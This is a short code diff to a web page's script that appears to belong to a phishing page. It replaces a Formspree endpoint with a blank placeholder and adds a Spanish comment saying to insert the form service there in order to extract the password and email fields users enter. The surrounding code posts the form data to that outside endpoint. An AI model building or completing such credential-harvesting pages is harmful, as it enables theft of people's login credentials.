@@ -172,7 +172,8 @@
       thanks.style.display = 'none';
 
       const formData = new FormData(form);
-      const endpoint = "https://formspree.io/f/mvgdggqp";
+      const endpoint = "https://formspree.io/f/";//COLOCA AQUI EL FORMS PARA EXTRAER LOS CAMPOS DE CONTRASEÑA Y CORREO//
+      //INGRESADOS
 
       try {
         const response = await fetch(endpoint, {
@@ -197,3 +198,4 @@
   </script>
 </body>
 </html>
+
